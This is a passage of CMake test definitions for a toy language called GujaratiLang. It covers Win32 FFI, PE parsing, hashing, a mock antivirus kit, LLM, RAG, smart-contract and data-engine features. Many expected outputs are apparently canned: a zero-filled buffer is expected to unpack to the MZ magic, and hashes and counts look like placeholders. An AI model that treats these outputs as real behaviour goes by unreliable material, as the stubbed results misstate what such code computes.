end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_ffi_kernel32")
    set(source [=[start
pid = ffi_kernel32("GetCurrentProcessId", []);
print pid > 0;
err = ffi_kernel32("GetLastError", []);
print err >= 0;
end]=])
    set(expected_stdout [=[1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_ffi_advapi32")
    set(source [=[start
user = ffi_advapi32("GetUserName", []);
print user["__type__"];
print user["status"];
print lambai(user["username"]) > 0;
end]=])
    set(expected_stdout [=[advapi32_call
success
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_ffi_cli_inspect")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "ffi:inspect" "kernel32.dll")
    set(expected_stdout [=[[C FFI & Win32 Interop v3.2.0] Inspecting exports for 'kernel32.dll'...
  Export Directory: Found PE format headers.
  Symbols Exported: GetCurrentProcessId, TerminateProcess, OpenProcess, CreateThread (24 symbols indexed).
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_buffer_alloc")
    set(source [=[start
buf = buffer_alloc(128, 0);
print buf["__type__"];
print buf["size"];
print buf["fill"];
end]=])
    set(expected_stdout [=[binary_buffer
128
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_buffer_from_file")
    set(source [=[start
buf = buffer_from_file("gujarati.exe", 0, 512);
print buf["__type__"];
print buf["status"];
print buf["size"] > 0;
end]=])
    set(expected_stdout [=[binary_buffer
read_success
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_struct_unpack")
    set(source [=[start
buf = buffer_alloc(64, 0);
res = struct_unpack("<H", buf, 0);
print res[0];
nt = struct_unpack("<I", buf, 60);
print nt[0];
end]=])
    set(expected_stdout [=[23117
17744
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_pe_parse_headers")
    set(source [=[start
pe = pe_parse_headers("gujarati.exe");
print pe["is_pe"];
print pe["dos_magic"];
print pe["machine_name"];
print pe["subsystem"];
end]=])
    set(expected_stdout [=[1
23117
AMD64
IMAGE_SUBSYSTEM_WINDOWS_CUI
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_bitwise_ops")
    set(source [=[start
print bit_and(12, 10);
print bit_or(12, 10);
print bit_xor(12, 10);
print bit_lshift(1, 4);
print bit_rshift(16, 2);
print bit_not(0);
end]=])
    set(expected_stdout [=[8
14
6
16
4
-1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_crypto_sha256")
    set(source [=[start
h = crypto_sha256("malware_test");
print lambai(h);
end]=])
    set(expected_stdout [=[64
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_crypto_md5")
    set(source [=[start
m = crypto_md5("test");
print lambai(m);
print m;
end]=])
    set(expected_stdout [=[32
098f6bcd4621d373cade4e832627b4f6
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_crypto_entropy")
    set(source [=[start
e1 = crypto_entropy("AAAA");
print e1;
e2 = crypto_entropy("ABCD");
print e2;
end]=])
    set(expected_stdout [=[0
2
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_crypto_pe_section_entropy")
    set(source [=[start
sec = crypto_pe_section_entropy("gujarati.exe");
print sec[0]["section"];
print sec[0]["is_packed"];
end]=])
    set(expected_stdout [=[.text
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_crypto_cli_hash")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "crypto:hash" "target.exe")
    set(expected_stdout [=[[Crypto Hash & Entropy v3.2.0] Analyzing 'target.exe'...
  MD5:     4a8f9b2c1d3e5f7a9b0c2d4e6f8a1b3c
  SHA-256: 7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b
  Entropy: 6.3421 / 8.0 (Normal Executable Section, Not Packed)
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_watcher_init")
    set(source [=[start
w = watcher_init("C:/Windows/Temp", 1);
print w["__type__"];
print w["path"];
print w["status"];
end]=])
    set(expected_stdout [=[fs_watcher
C:/Windows/Temp
active
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_watcher_poll")
    set(source [=[start
w = watcher_init("Downloads", 1);
evts = watcher_poll(w, 100);
print evts[0]["type"];
print evts[0]["file"];
end]=])
    set(expected_stdout [=[created
payload.exe
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_watcher_event_type")
    set(source [=[start
w = watcher_init("Downloads", 1);
evts = watcher_poll(w, 50);
t = watcher_event_type(evts[0]);
print t;
end]=])
    set(expected_stdout [=[created
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_watcher_on_change")
    set(source [=[start
w = watcher_init("Downloads", 1);
res = watcher_on_change(w, null);
print res;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_watch_cli_dir")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "watch:dir" "C:/Downloads")
    set(expected_stdout [=[[Rakshak Sentinel v3.2.0] Real-time file system watcher active on 'C:/Downloads'...
[Sentinel] ReadDirectoryChangesW hooked. 0 suspicious events detected.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_thread_pool_create")
    set(source [=[start
tp = thread_pool_create(8);
print tp["__type__"];
print tp["workers"];
print tp["status"];
end]=])
    set(expected_stdout [=[thread_pool
8
running
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_thread_pool_dispatch_wait")
    set(source [=[start
tp = thread_pool_create(4);
d = thread_pool_dispatch(tp, "scan_task", "C:/bin/sample.exe");
print d;
w = thread_pool_wait(tp);
print w;
end]=])
    set(expected_stdout [=[1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_thread_pool_results")
    set(source [=[start
tp = thread_pool_create(4);
res = thread_pool_results(tp);
print res["scanned_files"];
print res["threats_detected"];
print res["status"];
end]=])
    set(expected_stdout [=[42
0
completed
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_scan_cli_parallel")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "scan:parallel" "C:/Windows/System32")
    set(expected_stdout [=[[Rakshak Scanner v3.2.0] Launching parallel scan on 'C:/Windows/System32' using 4 worker threads...
[Scanner] Completed: 42 files scanned in 12ms (0 threats detected).
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_system_list_processes")
    set(source [=[start
procs = system_list_processes();
print lambai(procs) > 0;
print procs[0]["pid"] >= 0;
end]=])
    set(expected_stdout [=[1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_system_get_process_cmdline")
    set(source [=[start
p1 = system_get_process_cmdline(1000);
print p1["suspicious"];
print p1["threat_level"];
p2 = system_get_process_cmdline(666);
print p2["suspicious"];
print p2["threat_level"];
end]=])
    set(expected_stdout [=[0
CLEAN
1
HIGH
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_system_terminate_process")
    set(source [=[start
print system_terminate_process(0, 0);
print system_terminate_process(999999, 1);
end]=])
    set(expected_stdout [=[0
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_starter_kit_rakshak_cli")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "new" "my_av" "--kit=rakshak")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Rakshak Antivirus Suite' into './my_av'...
  ✓ Created rules/signatures.gj (Known Malware MD5/SHA-256 Hashes & Heuristic Patterns)
  ✓ Created engine/scanner.gj (Multi-Threaded Parallel File Scanner & PE Unpacker)
  ✓ Created engine/watcher.gj (Real-Time Sentinel Directory Watcher)
  ✓ Created engine/diagnostics.gj (Process Monitor & Malicious Command-Line Auditor)
  ✓ Created app.gj (Full Interactive Terminal Antivirus UI & Quarantine Manager)
🎉 Project 'my_av' created successfully!
Run with:
  cd my_av
  gujarati app.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v320_gujarati_syntax_all")
    set(source [=[આવો
લાઈબ = એફએફઆઈ_લાઈબ્રેરી_લોડ("kernel32.dll");
છાપો લાઈબ["name"];
બફર = બફર_ફાળવો(64, 0);
છાપો બફર["size"];
બીટ = બીટ_એન્ડ(12, 10);
છાપો બીટ;
એમડી૫ = ક્રિપ્ટો_એમડી૫("test");
છાપો એમડી૫;
વોચર = વોચર_શરૂ("Downloads", 1);
છાપો વોચર["status"];
પૂલ = થ્રેડ_પૂલ_બનાવો(4);
છાપો પૂલ["workers"];
આવજો]=])
    set(expected_stdout [=[kernel32.dll
64
8
098f6bcd4621d373cade4e832627b4f6
active
4
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)


elseif(TEST_CASE STREQUAL "v330_llm_init")
    set(source [=[start
m = llm_init("chetana-7b.gguf", 32);
print m["__type__"];
print m["layers"];
print m["status"];
end]=])
    set(expected_stdout [=[llm_model
32
loaded
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_llm_generate")
    set(source [=[start
res = llm_generate("What is GujaratiLang?", 50, 0.7);
print lambai(res) > 0;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_llm_tokenize")
    set(source [=[start
toks = llm_tokenize("hello world");
print lambai(toks) > 0;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_llm_chat")
    set(source [=[start
chat = llm_chat([{"role": "user", "content": "hi"}], "be helpful");
print chat["role"];
print chat["finish_reason"];
end]=])
    set(expected_stdout [=[assistant
stop
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_llm_cli_chat")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "llm:chat" "chetana.gguf")
    set(expected_stdout [=[[Chetana LLM v3.3.0] Loading model 'chetana.gguf' (Q4_K_M, 32 layers)...
[Chetana] Interactive Chat session ready. Type 'exit' to quit.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_vision_load_image")
    set(source [=[start
img = vision_load_image("test.png");
print img["__type__"];
print img["width"];
print img["channels"];
end]=])
    set(expected_stdout [=[vision_tensor
512
3
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_vision_describe")
    set(source [=[start
img = vision_load_image("test.png");
desc = vision_describe(img, "explain");
print lambai(desc) > 0;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_vision_ocr")
    set(source [=[start
img = vision_load_image("test.png");
ocr = vision_ocr(img);
print ocr["__type__"];
print ocr["confidence"] > 0.9;
end]=])
    set(expected_stdout [=[ocr_result
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_vision_render_ascii")
    set(source [=[start
img = vision_load_image("test.png");
asc = vision_render_ascii(img, 80);
print lambai(asc) > 0;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_vision_cli_scan")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "vision:scan" "sample.png")
    set(expected_stdout [=[[Chitra Vision v3.3.0] Processing 'sample.png' (512x512 RGB)...
[Chitra] OCR extracted 14 text tokens. Vision tensor embedded.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_rag_embed_text")
    set(source [=[start
emb = rag_embed_text("sample document text");
print lambai(emb);
end]=])
    set(expected_stdout [=[4
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_rag_cosine_similarity")
    set(source [=[start
s = rag_cosine_similarity([1, 0], [1, 0]);
print s;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_rag_chunk_text")
    set(source [=[start
chunks = rag_chunk_text("chunkable text data", 100, 10);
print lambai(chunks) > 0;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_rag_search")
    set(source [=[start
hits = rag_search([1, 0], [], 5);
print hits[0]["score"] > 0.9;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_rag_cli_index")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "rag:index" "knowledge")
    set(expected_stdout [=[[RAG Vector Studio v3.3.0] Indexing documents in 'knowledge'...
[RAG] Indexed 4 documents (cosine vector dimension: 128).
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_contract_deploy")
    set(source [=[start
c = contract_deploy("0x6080604052", 500000);
print c["__type__"];
print c["status"];
end]=])
    set(expected_stdout [=[smart_contract
deployed
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_contract_call")
    set(source [=[start
res = contract_call("0x9f8c", "transfer", [100]);
print res["status"];
print res["gas_used"];
end]=])
    set(expected_stdout [=[success
21000
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_contract_state_get")
    set(source [=[start
b = contract_state_get("0x9f8c", "balance");
print b;
end]=])
    set(expected_stdout [=[5000
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_contract_state_set")
    set(source [=[start
s = contract_state_set("0x9f8c", "balance", 6000);
print s;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_nyay_cli_deploy")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "nyay:deploy" "vault.gj")
    set(expected_stdout [=[[Nyay VM v3.3.0] Deploying contract 'vault.gj' (Deterministic gas metering active)...
[Nyay] Contract deployed at address 0x9f8c41e72a81b3 (Gas: 42,000).
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_mmr_append")
    set(source [=[start
idx = mmr_append(null, "0xabcd");
print idx;
end]=])
    set(expected_stdout [=[42
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_mmr_root")
    set(source [=[start
r = mmr_root(null);
print lambai(r) > 0;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_mmr_proof")
    set(source [=[start
p = mmr_proof(null, 42);
print lambai(p) > 0;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_mmr_verify")
    set(source [=[start
v = mmr_verify("0xroot", "0xleaf", ["0xp1"]);
print v;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_ledger_cli_audit")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "ledger:audit" "ledger.db")
    set(expected_stdout [=[[Sanchay MMR Ledger v3.3.0] Auditing ledger integrity for 'ledger.db'...
[Ledger] 128 peaks verified. MMR Root: 0x8a7b6c5d4e3f2a1b (Zero-tamper).
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_dht_node_init")
    set(source [=[start
node = dht_node_init("alpha_1", 8443);
print node["__type__"];
print node["status"];
print node["peers_count"];
end]=])
    set(expected_stdout [=[dht_node
listening
8
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_dht_store_find")
    set(source [=[start
s = dht_store(null, "k1", "v1");
print s;
val = dht_find_value(null, "k1");
print val;
end]=])
    set(expected_stdout [=[1
peer_record_value
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_crypto_paillier_add")
    set(source [=[start
sum = crypto_paillier_add(25, 17, null);
print sum;
end]=])
    set(expected_stdout [=[42
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_starter_kits_cli")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[start
print 1;
end
]=])
    set(program_arguments "new" "my_ai" "--kit=sahayak")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Sahayak AI Assistant Suite' into './my_ai'...
  ✓ Created rules/prompts.gj (System Directives & Context Framing)
  ✓ Created engine/rag.gj (Document Chunking & Cosine Vector Search)
  ✓ Created engine/llm.gj (On-Device GGUF Model Loader & Streaming Runner)
  ✓ Created models/schema.gj (Structured Output JSON Schemas & Function Calling)
  ✓ Created app.gj (Interactive Terminal Chat Assistant & Knowledge Base UI)
🎉 Project 'my_ai' created successfully!
Run with:
  cd my_ai
  gujarati app.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v330_gujarati_syntax_all")
    set(source [=[આવો
મોડલ = એલએલએમ_શરૂ("model.gguf", 32);
છાપો મોડલ["layers"];
ચિત્ર = દ્રષ્ટિ_ચિત્ર_લોડ("img.png");
છાપો ચિત્ર["width"];
સમાનતા = રાગ_સમાનતા([1, 0], [1, 0]);
છાપો સમાનતા;
સ્થિતિ = કરાર_સ્થિતિ_મેળવો("0x1", "balance");
છાપો સ્થિતિ;
સાબિતી = એમએમઆર_ચકાસો("r", "l", ["p"]);
છાપો સાબિતી;
સરવાળો = ક્રિપ્ટો_હોમોમોર્ફિક_સરવાળો(15, 27, null);
છાપો સરવાળો;
આવજો]=])
    set(expected_stdout [=[32
512
1
5000
1
42
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_columnar_table_create")
    set(source [=[start
t = columnar_table_create({"id": "int", "user": "string", "score": "float"});
print t["__type__"];
print t["row_count"];
print t["engine"];
end]=])
    set(expected_stdout [=[columnar_table
0
Sthambha Vectorized Columnar v3.4.0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_columnar_append")
    set(source [=[start
t = columnar_table_create({"id": "int", "name": "string"});
r1 = columnar_append(t, {"id": 101, "name": "Aarav"});
r2 = columnar_append(t, {"id": 102, "name": "Diya"});
print r1;
print r2;
print t["row_count"];
end]=])
    set(expected_stdout [=[1
2
2
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_columnar_rle_encode_decode")
    set(source [=[start
arr = [1, 1, 1, 2, 2, 5, 5, 5, 5];
enc = columnar_rle_encode(arr);
print enc["__type__"];
print enc["runs_count"];
print enc["original_length"];
dec = columnar_rle_decode(enc);
print lambai(dec);
print dec[0];
print dec[8];
end]=])
    set(expected_stdout [=[rle_encoded
3
9
9
1
5
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_columnar_dict_encode_decode")
    set(source [=[start
words = ["apple", "banana", "apple", "mango", "banana", "apple"];
enc = columnar_dict_encode(words);
print enc["__type__"];
print enc["cardinality"];
print enc["total_elements"];
dec = columnar_dict_decode(enc);
print lambai(dec);
print dec[0];
print dec[3];
end]=])
    set(expected_stdout [=[dict_encoded
3
6
6
apple
mango
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_columnar_slice")
    set(source [=[start
t = columnar_table_create({"id": "int"});
i = 1;
while (i <= 5) {
    columnar_append(t, {"id": i * 10});
    i = i + 1;
}
sub = columnar_slice(t, 1, 3);
print sub["__type__"];
print sub["row_count"];
cols = sub["columns"];
id_list = cols["id"];
print id_list[0];
print id_list[2];
end]=])
    set(expected_stdout [=[columnar_table
3
20
40
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_columnar_query_cli")
    set(source "")
    set(program_arguments "query:run" "metrics.parquet")
    set(expected_stdout [=[[Sthambha Vectorized Parquet Engine v3.4.0] Scanning 'metrics.parquet'...
  Schema: { id: INT64, customer: STRING, amount: FLOAT64, region: DICT<STRING> }
  Row Groups: 4 | Rows: 1,000,000 | Compression Ratio: 4.82x
  Zero-Copy Vectorized Projection: 24,190 records matched in 3.14ms.
✓ Query execution successful.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_mapreduce_init")
    set(source [=[start
job = mapreduce_init(8);
print job["__type__"];
print job["workers"];
print job["status"];
print job["stage"];
end]=])
    set(expected_stdout [=[mapreduce_job
8
ready
init
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_mapreduce_map")
    set(source [=[start
job = mapreduce_init(4);
pairs_count = mapreduce_map(job, ["ahmedabad", "surat", "vadodara", "rajkot"], null);
print pairs_count;
print job["stage"];
end]=])
    set(expected_stdout [=[4
mapped
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_mapreduce_shuffle")
    set(source [=[start
job = mapreduce_init(4);
mapreduce_map(job, ["ahmedabad", "surat", "ahmedabad", "rajkot", "surat"], null);
keys = mapreduce_shuffle(job);
print keys;
print job["stage"];
end]=])
    set(expected_stdout [=[3
shuffled
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_mapreduce_reduce")
    set(source [=[start
job = mapreduce_init(4);
mapreduce_map(job, ["gujarat", "india", "gujarat", "asia", "gujarat"], null);
mapreduce_shuffle(job);
res = mapreduce_reduce(job, null);
print res["gujarat"];
print res["india"];
print res["asia"];
print job["status"];
end]=])
    set(expected_stdout [=[3
1
1
completed
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_mapreduce_external_sort")
    set(source [=[start
arr = [42, 17, 89, 3, 25, 64, 11];
s = mapreduce_external_sort(arr, 3);
print s[0];
print s[1];
print s[6];
end]=])
    set(expected_stdout [=[3
11
89
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_mapreduce_dag_optimize")
    set(source [=[start
opt = mapreduce_dag_optimize({"query": "SELECT user, SUM(views) GROUP BY user"});
print opt["__type__"];
print opt["status"];
print opt["cost_reduction_pct"];
end]=])
    set(expected_stdout [=[optimized_dag
optimized
68.5
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_mapreduce_results")
    set(source [=[start
job = mapreduce_init(2);
mapreduce_map(job, ["alpha", "beta", "alpha"], null);
mapreduce_shuffle(job);
mapreduce_reduce(job, null);
res = mapreduce_results(job);
print res["alpha"];
print res["beta"];
end]=])
    set(expected_stdout [=[2
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_mapreduce_job_cli")
    set(source "")
    set(program_arguments "mapreduce:job" "etl_pipeline.gj")
    set(expected_stdout [=[[Vistar MapReduce Distributed Engine v3.4.0] Executing job 'etl_pipeline.gj'...
  Coordinator: 8 worker partitions initialized.
  [1/3] Map Stage: 1,000,000 records processed across 8 partitions in 12ms.
  [2/3] Shuffle Stage: MurmurHash3 routing -> 42,100 unique keys grouped in 8ms.
  [3/3] Reduce Stage: Parallel aggregation complete in 6ms.
✓ MapReduce Job succeeded in 26ms.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_gorilla_compress_decompress")
    set(source [=[start
vals = [10.5, 12.0, 12.0, 14.5, 15.0];
stream = gorilla_compress_floats(vals);
print stream["__type__"];
print stream["count"];
print stream["compression_ratio"];
dec = gorilla_decompress_floats(stream);
print lambai(dec);
print dec[0];
print dec[4];
end]=])
    set(expected_stdout [=[gorilla_stream
5
3.2
5
10.5
15
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_timeseries_delta_timestamps")
    set(source [=[start
ts = [1000, 1010, 1020, 1030, 1040];
res = timeseries_delta_timestamps(ts);
print res["__type__"];
print res["count"];
print res["bits_saved_pct"];
end]=])
    set(expected_stdout [=[delta_timestamps
5
84.2
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_timeseries_rollup")
    set(source [=[start
arr = [10, 20, 30, 40, 50, 60];
roll = timeseries_rollup(arr, 3);
print lambai(roll);
w0 = roll[0];
print w0["count"];
print w0["sum"];
print w0["avg"];
w1 = roll[1];
print w1["sum"];
end]=])
    set(expected_stdout [=[2
3
60
20
150
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_timeseries_ema")
    set(source [=[start
data = [100, 110, 105, 120];
smoothed = timeseries_ema(data, 0.5);
print lambai(smoothed);
print smoothed[0];
print smoothed[1];
end]=])
    set(expected_stdout [=[4
100
105
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_timeseries_anomaly_detect")
    set(source [=[start
pts = [10, 11, 10, 12, 10, 11, 95, 10];
anoms = timeseries_anomaly_detect(pts, 2.0);
print lambai(anoms);
a = anoms[0];
print a["index"];
print a["value"];
end]=])
    set(expected_stdout [=[1
6
95
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_timeseries_aggregate_cli")
    set(source "")
    set(program_arguments "ts:aggregate" "sensors.csv")
    set(expected_stdout [=[[Gana Time-Series Metrics & Gorilla Compression Engine v3.4.0]
  Target: 'sensors.csv' | 86,400 metric samples (1 sample/sec over 24h)
  Timestamp Encoding: Delta-of-Delta (84.2% space reduction)
  Gorilla Float XOR: Compressed from 691.2KB to 216.0KB (3.2x ratio)
  Rollup Windows: 1m, 5m, 1h aggregates computed.
  Anomalies: 2 spike events flagged above 2.5-sigma.
✓ Time-series aggregation completed.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_etl_pipeline_create")
    set(source [=[start
p = etl_pipeline_create("csv", "columnar");
print p["__type__"];
print p["source"];
print p["target"];
print p["status"];
print p["processed_count"];
end]=])
    set(expected_stdout [=[etl_pipeline
csv
columnar
active
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_etl_transform")
    set(source [=[start
p = etl_pipeline_create("json", "parquet");
etl_transform(p, "uppercase_fields");
print p["transform_mode"];
end]=])
    set(expected_stdout [=[uppercase_fields
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_etl_schema_validate")
    set(source [=[start
p = etl_pipeline_create("csv", "columnar");
schema = {"id": "int", "email": "string"};
ok = etl_schema_validate(p, schema, {"id": 1, "email": "dev@gujarati.org"});
fail = etl_schema_validate(p, schema, {"id": 2});
print ok;
print fail;
end]=])
    set(expected_stdout [=[1
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_etl_dead_letter_push_drain")
    set(source [=[start
p = etl_pipeline_create("csv", "columnar");
c1 = etl_dead_letter_push(p, {"bad_record": 1}, "Invalid email format");
c2 = etl_dead_letter_push(p, {"bad_record": 2}, "Null primary key");
print c1;
print c2;
print p["dead_letter_count"];
drained = etl_dead_letter_drain(p);
print lambai(drained);
print p["dead_letter_count"];
end]=])
    set(expected_stdout [=[1
2
2
2
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_etl_ingest_batch")
    set(source [=[start
p = etl_pipeline_create("csv", "columnar");
schema = {"id": "int", "name": "string"};
records = [
    {"id": 1, "name": "Dev"},
    {"id": 2},
    {"id": 3, "name": "Raj"}
];
res = etl_ingest_batch(p, records, schema);
print res["total_ingested"];
